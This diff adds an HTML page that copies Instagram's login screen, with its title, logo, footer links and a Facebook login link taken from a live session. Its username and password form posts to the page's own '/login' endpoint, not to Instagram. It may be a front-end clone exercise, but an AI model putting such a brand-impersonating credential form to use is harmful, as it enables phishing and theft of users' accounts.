@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="styles.css" />
+    <title>Login&nbsp;•&nbsp;Instagram</title>
+</head>
+<body>
+    <main class="flex align-items-center justify-content-center">
+        <section id="mobile" class="flex">
+        </section>
+        <section id="auth" class=" container flex direction-column">
+            <div class="panel login flex direction-column">
+                <h1 title="Instagram" class="flex justify-content-center">
+                    <img src="./img//instagram-logo.png" alt="Instagram logo" title="Instagram logo" />
+                </h1>
+                <form action="/login" method="POST">
+                    <label for="email" class="sr-only">Phone number, username or email</label>
+                    <input  id=username name=username required placeholder="Phone number, username or email" />
+
+                    <label for="password" class="sr-only">Password</label>
+                    <input name="password" id=password  required type="password" placeholder="Password" />
+
+                    <button type="submit">Log In</button>
+                </form>
+                <div class="flex separator align-items-center">
+                    <span></span>
+                    <div class="or">OR</div>
+                    <span></span>
+                </div>
+                <div class="login-with-fb flex direction-column align-items-center">
+                    <div>
+                        <img />
+                        <a href="https://www.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26locale%3Den_US%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26response_type%3Dcode%252Cgranted_scopes%26scope%3Demail%26state%3D%257B%2522fbLoginKey%2522%253A%252219235ln1hh0hml9gs45r1s50i9a3jqf5522evx51hdqvc81du11r9%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253Dhttps%25253A%25252F%25252Fwww.instagram.com%25252Fdirect%25252Ft%25252F17843269274930441%25252F%25253F__coig_login%25253D1%2522%257D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D013f0e89-3d9a-4a2c-8df5-8bc20cc01a59%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%252219235ln1hh0hml9gs45r1s50i9a3jqf5522evx51hdqvc81du11r9%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253Dhttps%25253A%25252F%25252Fwww.instagram.com%25252Fdirect%25252Ft%25252F17843269274930441%25252F%25253F__coig_login%25253D1%2522%257D%23_%3D_&display=page&locale=en_GB&pl_dbl=0">Login with Facebook</a>
+                    </div>
+                    <a href="https://www.instagram.com/accounts/password/reset/?next=https%3A%2F%2Fwww.instagram.com%2Fdirect%2Ft%2F17843269274930441%2F%3F__coig_login%3D1">Forgot Password?</a>
+                </div>
+            </div>
+            <div class="panel register flex justify-content-center">
+                <p>Don't have an account?</p>
+                <a href="https://www.instagram.com/accounts/emailsignup/?next=https%3A%2F%2Fwww.instagram.com%2Fdirect%2Ft%2F17843269274930441%2F%3F__coig_login%3D1">Sign up</a>
+            </div>
+            <div class="app-download flex direction-column align-items-center">
+                <p>Get the app</p>  
+                <div class="flex justify-content-center">
+                    <img src="./img/apple-button.png"      alt="Imagem com a logo da Apple Store" title="Imagem com a logo da Apple Store" />
+                    <img src="./img/googleplay-button.png" alt="Imagem com a logo da Google Play" title="Imagem com a logo da Google Play" />
+                </div>
+            </div>
+        </section>
+    </main>
+    <footer>
+        <ul class="foot-items flex flex-wrap justify-content-center">
+            <li><a href="https://about.meta.com/">Meta</a></li>
+            <li><a href="https://about.instagram.com/">About</a></li>
+            <li><a href="https://about.instagram.com/blog/">Blog</a></li>
+            <li><a href="https://www.instagram.com/about/jobs/?next=https%3A%2F%2Fwww.instagram.com%2Fdirect%2Ft%2F17843269274930441%2F%3F__coig_login%3D1">Jobs</a></li>
+            <li><a href="https://help.instagram.com/">Help</a></li>
+            <li><a href="https://developers.facebook.com/docs/instagram">Api</a></li>
+            <li><a href="https://www.instagram.com/legal/privacy/?next=https%3A%2F%2Fwww.instagram.com%2Fdirect%2Ft%2F17843269274930441%2F%3F__coig_login%3D1">Privacy</a></li>
+            <li><a href="https://www.instagram.com/legal/terms/?next=https%3A%2F%2Fwww.instagram.com%2Fdirect%2Ft%2F17843269274930441%2F%3F__coig_login%3D1">Terms</a></li>
+            <li><a href="https://www.instagram.com/explore/locations/?next=https%3A%2F%2Fwww.instagram.com%2Fdirect%2Ft%2F17843269274930441%2F%3F__coig_login%3D1">Locations</a></li>
+            <li><a href="https://www.instagram.com/web/lite/?next=https%3A%2F%2Fwww.instagram.com%2Fdirect%2Ft%2F17843269274930441%2F%3F__coig_login%3D1">Instagram Lite</a></li>
+            <li><a href="https://www.threads.net/">Threads</a></li>
+            <li><a href="https://l.instagram.com/?u=https%3A%2F%2Fwww.facebook.com%2Fhelp%2Finstagram%2F261704639352628%3Fnext%3Dhttps%253A%252F%252Fwww.instagram.com%252Fdirect%252Ft%252F17843269274930441%252F%253F__coig_login%253D1&e=AT1heegbEeSQOulYHYBPlK4A_hkDVtpsC85gIpVrnNNGtcMP2pNaLS7Z7aey8kEcPubR07rEIGwMs04VMkDrX7rN5YeOfQpAfDUTQGqeBNyI-Yv50U1FOpOBBNEMLCAWQt1RkmkdnSsIOxrumt0JYdWCPSEbaQ">Content Uploading & Non-users</a></li>
+            <li><a href="https://about.meta.com/technologies/meta-verified/">Meta Verified</a></li>
+        </ul>
+        <p class="copyright">© 2023 Instagram from Meta</p>
+    </footer>
+</body>
+</html>
